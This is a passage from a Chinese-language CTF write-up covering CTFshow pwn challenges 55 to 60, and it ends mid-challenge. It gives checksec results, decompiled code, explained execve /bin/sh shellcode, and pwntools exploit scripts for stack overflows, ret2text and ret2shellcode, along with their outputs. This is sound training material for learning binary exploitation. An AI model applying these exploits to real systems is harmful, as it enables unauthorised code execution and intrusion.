<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 103</span><br><span class="line">b<span class="string">&#x27;CTFshow_PWN_r00t_p@ssw0rd_1s_h3r3&#x27;</span></span><br><span class="line">[*] Process <span class="string">&#x27;./pwn&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 103)</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 105</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./pwn&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 105)</span><br><span class="line">==========CTFshow-LOGIN==========</span><br><span class="line">Input your Username:</span><br><span class="line">Welcome bit,</span><br><span class="line">Input your Password.</span><br><span class="line">Welcome! Here<span class="string">&#x27;s what you want:</span></span><br><span class="line"><span class="string">flag&#123;just_test_my_process&#125;</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>

<h2 id="pwn55"><a href="#pwn55" class="headerlink" title="pwn55"></a>pwn55</h2><p>Hint：你是我的谁，我的我是你的谁</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位关闭栈保护与PIE</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  logo(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How to find flag?&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+Ch] [ebp-2Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your flag: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gets函数输入，没有限制读入长度，存在溢出漏洞</p>
<p>发现三个跟flag有关的函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">flag</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [esp+Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">48</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( flag1 &amp;&amp; flag2 &amp;&amp; a1 == <span class="number">-1111638595</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( flag1 &amp;&amp; flag2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Incorrect Argument.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( flag1 || flag2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Nice Try!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Flag is not here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到程序将flag读入到了参数s里面，满足条件flag1&amp;&amp;flag2 &amp;&amp;a1&#x3D;&#x3D;0xBDBDBDBD的条件，就能读出flag</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Elf32_Dyn **<span class="title function_">flag_func1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Dyn **_GLOBAL_OFFSET_TABLE; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  _GLOBAL_OFFSET_TABLE = &amp;GLOBAL_OFFSET_TABLE_;</span><br><span class="line">  flag1 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> _GLOBAL_OFFSET_TABLE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag_func1函数直接给flag1赋值成了1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Elf32_Dyn **__cdecl <span class="title function_">flag_func2</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Dyn **_GLOBAL_OFFSET_TABLE; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  _GLOBAL_OFFSET_TABLE = &amp;GLOBAL_OFFSET_TABLE_;</span><br><span class="line">  <span class="keyword">if</span> ( flag1 &amp;&amp; a1 == <span class="number">-1397969748</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    flag2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( flag1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> (Elf32_Dyn **)<span class="built_in">puts</span>(<span class="string">&quot;Try Again.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> (Elf32_Dyn **)<span class="built_in">puts</span>(<span class="string">&quot;Try a little bit.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _GLOBAL_OFFSET_TABLE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag_func2函数当满足条件的时候会将flag2赋值为1</p>
<p>那么我们思路就很明确了，首先溢出后覆盖ret为flag_func1,将flag1赋值为1。之后跳转到flag_func2的地址，a1是传入的参数，将a1传入即可满足条件去设置flag2的值为1，之后去执行flag函数，if要满足的条件之前都设置好了，可以直接读出flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28199)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag_func1 = elf.sym[<span class="string">&#x27;flag_func1&#x27;</span>]</span><br><span class="line">flag_func2 = elf.sym[<span class="string">&#x27;flag_func2&#x27;</span>]</span><br><span class="line">flag = elf.sym[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * (<span class="number">0x2c</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(flag_func1)</span><br><span class="line">payload += p32(flag_func2) + p32(flag) + p32(<span class="number">0xACACACAC</span>) + p32(<span class="number">0xBDBDBDBD</span>) <span class="comment">#-1397969748（0xACACACAC）,-1111638595（0xBDBDBDBD）</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;flag: &quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 1300</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn56"><a href="#pwn56" class="headerlink" title="pwn56"></a>pwn56</h2><p>Hint：先了解一下简单的32位shellcode吧</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      No RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX disabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护全关</p>
<p>IDA查看一下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> _bin___sh_[<span class="number">10</span>]; <span class="comment">// [esp-Ch] [ebp-Ch] BYREF</span></span><br><span class="line">  __int16 v2; <span class="comment">// [esp-2h] [ebp-2h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(_bin___sh_, <span class="string">&quot;/bin///sh&quot;</span>);</span><br><span class="line">  v0 = sys_execve(_bin___sh_, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显就是简单的调用了一个shell，那么我们进行逐步分析：</p>
<p>先将汇编代码拿出来分析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push    68h ; &#x27;h&#x27;</span><br><span class="line">push    732F2F2Fh</span><br><span class="line">push    6E69622Fh</span><br><span class="line">mov     ebx, esp        ; file</span><br><span class="line">xor     ecx, ecx        ; argv</span><br><span class="line">xor     edx, edx        ; envp</span><br><span class="line">push    0Bh</span><br><span class="line">pop     eax</span><br><span class="line">int     80h             ; LINUX - sys_execve</span><br></pre></td></tr></table></figure>

<p>这段代码是x86汇编语言的代码，用于在Linux系统上执行一个系统调用来执行</p>
<p>execve(“&#x2F;bin&#x2F;sh”, NULL, NULL) 。让我们逐行解析代码的功能：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x68 </span><br><span class="line">#这行代码将十六进制值 0x68 （104的十进制表示）压入栈中。这是为了将后续的字符串 &quot;/bin/sh&quot;的长度（11个字符）放入栈中，以便后续使用。</span><br><span class="line">push 0x732f2f2f</span><br><span class="line">#这行代码将十六进制值 0x732f2f2f 压入栈中。这是字符串 &quot;/bin/sh&quot; 的前半部分字符的逆序表示，即 &quot;sh//&quot;。这是因为x86架构是小端字节序的，字符串需要以逆序方式存储在内存中。</span><br><span class="line">push 0x6e69622f</span><br><span class="line">#这行代码将十六进制值 0x6e69622f 压入栈中。这是字符串 &quot;/bin/sh&quot; 的后半部分字符的逆序表</span><br><span class="line">示，即 &quot;/bin&quot;。</span><br><span class="line">mov ebx,esp</span><br><span class="line">#这行代码将栈顶的地址（即字符串&quot;/bin/sh&quot;的起始地址）复制给寄存器 ebx。ebx寄存器将用作execve 系统调用的第一个参数，即要执行的可执行文件的路径。</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">#这两行代码使用异或操作将 ecx 和 edx 寄存器的值设置为零。 ecx 和 edx 分别将用作 execve系统调用的第二个和第三个参数，即命令行参数和环境变量。在此情况下，我们将它们设置为 NULL，表示没有命令行参数和环境变量。</span><br><span class="line">push 0xB</span><br><span class="line">pop eax</span><br><span class="line">这两行代码将值11（0xb）压入栈中，然后从栈中弹出到寄存器 eax。eax寄存器将用作系统调用号，11表示execve系统调用的系统调用号。</span><br><span class="line">int 0x80</span><br><span class="line">这行代码触发中断 0x80 ，这是Linux系统中用于执行系统调用的中断指令。通过设置适当的寄存器值（ eax 、 ebx 、 ecx 、 edx ）， int 0x80 指令将执行 execve(&quot;/bin/sh&quot;, NULL, NULL) 系统调用，从而启动一个新的 shell 进程。</span><br></pre></td></tr></table></figure>

<p>总结起来，这段汇编代码的功能是利用系统调用在Linux系统上执行 execve(“&#x2F;bin&#x2F;sh”, NULL,NULL) ，即打开一个新的shell进程。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28159</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure>

<h2 id="pwn57"><a href="#pwn57" class="headerlink" title="pwn57"></a>pwn57</h2><p>Hint：先了解一下简单的64位shellcode吧</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      No RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX disabled</span><br><span class="line">  PIE:        No PIE (0x400000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>64位保护全关</p>
<p>IDA查看一下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __asm &#123; syscall; LINUX - &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将汇编代码拿出来逐步分析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push    rax</span><br><span class="line">xor     rdx, rdx</span><br><span class="line">xor     rsi, rsi</span><br><span class="line">mov     rbx, 68732F2F6E69622Fh  </span><br><span class="line">push    rbx</span><br><span class="line">push    rsp</span><br><span class="line">pop     rdi</span><br><span class="line">mov     al, 3Bh ; &#x27;;&#x27;</span><br><span class="line">syscall                 ; LINUX -</span><br></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">采用的是小端字节序,逆序</span><br><span class="line">2F 62 69 6E 2F 2F 73 68</span><br><span class="line">/  b  i  n  /  /  s  h</span><br><span class="line">在Linux系统中，路径里连续的斜杠/会被当作单个斜杠来处理。所以，/bin//sh 和/bin/sh 指向的是同一个文件。</span><br></pre></td></tr></table></figure>

<p>这段代码是x86-64汇编语言的代码，用于在Linux系统上执行 execve(“&#x2F;bin&#x2F;sh”, NULL,NULL) 。让我们逐行解析代码的功能：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push rax </span><br><span class="line">#这行代码将 rax 寄存器的值（通常用于存放函数返回值）压入栈中。这里的目的是保留 rax 的值，以便后续使用。</span><br><span class="line">xor rdx, rdx</span><br><span class="line">xor rsi, rsi</span><br><span class="line">#这两行代码使用异或操作将 rdx 和 rsi 寄存器的值设置为零。 rdx 和 rsi 分别将用作 execve系统调用的第三个和第二个参数，即环境变量和命令行参数。在此情况下，我们将它们设置为 NULL，表示没有环境变量和命令行参数。</span><br><span class="line">mov rbx, &#x27;/bin//sh&#x27; </span><br><span class="line">#这行代码将字符串 &#x27;/bin//sh&#x27; 的地址赋值给 rbx 寄存器。字符串 &#x27;/bin//sh&#x27; 是我们要执行的可执行文件的路径。在x86-64汇编中，字符串被当作地址处理。</span><br><span class="line">push rbx </span><br><span class="line">#这行代码将 rbx 寄存器的值（字符串 &#x27;/bin//sh&#x27; 的地址）压入栈中。这是为了将可执行文件路径传递给 execve 系统调用的第一个参数。</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">#这两行代码将栈顶的地址（即字符串&#x27;/bin//sh&#x27;的地址）弹出到rdi寄存器。rdi寄存器将用作execve 系统调用的第一个参数，即可执行文件路径。</span><br><span class="line">mov al, 59 </span><br><span class="line">#这行代码将 al 寄存器设置为值 59 ， 59 是 execve 系统调用的系统调用号。</span><br><span class="line">syscall </span><br><span class="line">#这行代码触发系统调用。通过设置适当的寄存器值（ rax 、rdi、rsi、rdx），syscall指令将执行execve(&quot;/bin/sh&quot;, NULL, NULL) 系统调用，从而启动一个新的 shell 进程。</span><br></pre></td></tr></table></figure>

<p>总结起来，这段汇编代码的功能是利用系统调用在Linux系统上执行 execve(“&#x2F;bin&#x2F;sh”, NULL,NULL) ，即打开一个新的shell进程。与前一个示例相比，这段代码是x86-64架构下的汇编代码，使用通用寄存器进行操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28195</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure>

<h2 id="pwn58"><a href="#pwn58" class="headerlink" title="pwn58"></a>pwn58</h2><p>Hint：32位 无限制</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位仅部分开启RELRO，其他保护全关，并且有可读，可写，可执行段</p>
<p>IDA简单分析（这里无法进行反编译，直接看汇编代码）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">s= byte ptr -0A0h</span><br><span class="line">var_C= dword ptr -0Ch</span><br><span class="line">argc= dword ptr  8</span><br><span class="line">argv= dword ptr  0Ch</span><br><span class="line">envp= dword ptr  10h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">lea     ecx, [esp+4]</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">push    dword ptr [ecx-4]</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ebx</span><br><span class="line">push    ecx</span><br><span class="line">sub     esp, 0A0h</span><br><span class="line">call    __x86_get_pc_thunk_bx</span><br><span class="line">add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">mov     eax, ds:(stdout_ptr - 804A000h)[ebx]</span><br><span class="line">mov     eax, [eax]</span><br><span class="line">push    0               ; n</span><br><span class="line">push    2               ; modes</span><br><span class="line">push    0               ; buf</span><br><span class="line">push    eax             ; stream</span><br><span class="line">call    _setvbuf</span><br><span class="line">add     esp, 10h</span><br><span class="line">call    _getegid</span><br><span class="line">mov     [ebp+var_C], eax</span><br><span class="line">sub     esp, 4</span><br><span class="line">push    [ebp+var_C]</span><br><span class="line">push    [ebp+var_C]</span><br><span class="line">push    [ebp+var_C]</span><br><span class="line">call    _setresgid</span><br><span class="line">add     esp, 10h</span><br><span class="line">call    logo</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">lea     eax, (aJustVeryEasyRe - 804A000h)[ebx] ; &quot;Just very easy ret2shellcode&amp;&amp;32bit&quot;</span><br><span class="line">push    eax             ; s</span><br><span class="line">call    _puts</span><br><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">lea     eax, (aAttachIt - 804A000h)[ebx] ; &quot;Attach it!&quot;</span><br><span class="line">push    eax             ; s</span><br><span class="line">call    _puts</span><br><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">lea     eax, [ebp+s]</span><br><span class="line">push    eax             ; s</span><br><span class="line">call    ctfshow</span><br><span class="line">add     esp, 10h</span><br><span class="line">lea     eax, [ebp+s]</span><br><span class="line">call    eax</span><br><span class="line">mov     eax, 0</span><br><span class="line">lea     esp, [ebp-8]</span><br><span class="line">pop     ecx</span><br><span class="line">pop     ebx</span><br><span class="line">pop     ebp</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 804864C</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure>

<p>看报错应该是这里无法进行反编译，流程其实也能很清楚的看出来，跟之前差不多，看到后面这里</p>
<p>调用了ctfshow函数，经验之谈漏洞点应该是在这的 ：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">ctfshow</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到有gets函数的调用，看汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; int __cdecl ctfshow(char *s)</span><br><span class="line">public ctfshow</span><br><span class="line">ctfshow proc near</span><br><span class="line"></span><br><span class="line">var_4= dword ptr -4</span><br><span class="line">s= dword ptr  8</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ebx</span><br><span class="line">sub     esp, 4</span><br><span class="line">call    __x86_get_pc_thunk_bx</span><br><span class="line">add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">push    [ebp+s]         ; s</span><br><span class="line">call    _gets</span><br><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">push    [ebp+s]         ; s</span><br><span class="line">call    _puts</span><br><span class="line">add     esp, 10h</span><br><span class="line">nop</span><br><span class="line">mov     ebx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 8048516</span><br><span class="line">ctfshow endp</span><br></pre></td></tr></table></figure>

<p>我们可以看出对gets函数调用，参数对应的是 [ebp+s] 的地址,也就是在返回地址上一栈内存单元处，对应主函数中，可以看到:gets 函数写入的地址即为 [ebp+s] 对应的地址，同时我们注意到:call 的地址即为 [ebp+s] 所指向的地址到这里思路就很明显了，我们先输入的内容会被 get 读取，存到内存 [ebp+s] 中，然后在函数在后面的时候，会调用这一部分内容。所以我们只要写入 shellcode ，函数后面就会调用 shellcode 。至于[ebp+s] 是指向哪里 ，我们可以看到 main 函数中没有 offset 变量，所以这 [ebp+s] 指的是局部变量，那就是在栈中，而 nx 保护没有开启，所以 shellcode 在栈上也可以执行。</p>
<p>故我们可以直接使用pwntools的shellcraft模块帮我们生成一个shellcode进行攻击。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28188)</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 1340</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Use shellcode to get shell!</span><br><span class="line">    * *************************************</span><br><span class="line">Just very easy ret2shellcode&amp;&amp;32bit</span><br><span class="line">Attach it!</span><br><span class="line">jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814<span class="variable">$ri</span>\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX̀</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure>

<h2 id="pwn59"><a href="#pwn59" class="headerlink" title="pwn59"></a>pwn59</h2><p>Hint：64位 无限制</p>
<p><code>分析流程同上，需要注意的是在生成shellcode的时候需要注明架构为64位</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28188)</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 1371</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Use shellcode to get shell!</span><br><span class="line">    * *************************************</span><br><span class="line">Just very easy ret2shellcode&amp;&amp;64bit</span><br><span class="line">Attach it!</span><br><span class="line">jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure>

<h2 id="pwn60"><a href="#pwn60" class="headerlink" title="pwn60"></a>pwn60</h2><p>Hint：入门难度shellcode</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br><span class="line">  Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，其余保护全关，并且有可读，可写，可执行段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;CTFshow-pwn can u pwn me 